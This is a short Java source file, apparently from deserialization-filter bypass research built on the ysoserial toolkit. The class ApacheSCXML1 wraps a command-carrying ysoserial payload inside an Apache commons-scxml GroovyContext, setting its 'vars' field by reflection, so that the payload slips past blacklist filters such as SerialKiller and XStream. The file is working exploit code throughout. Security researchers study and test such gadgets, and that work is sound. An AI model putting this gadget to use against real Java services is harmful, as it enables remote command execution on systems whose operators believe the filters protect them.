package serialkiller.bypass;

import org.apache.commons.scxml2.env.groovy.GroovyContext;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import java.util.HashMap;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "commons-scxml:commons-scxml:0.8" })
public class ApacheSCXML1 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);

        HashMap<String, Object> map = new HashMap<String, Object>();
        map.put("payload", payload);
        GroovyContext context = new GroovyContext();
        Reflections.setFieldValue(context, "vars", map);

        return context;
    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}
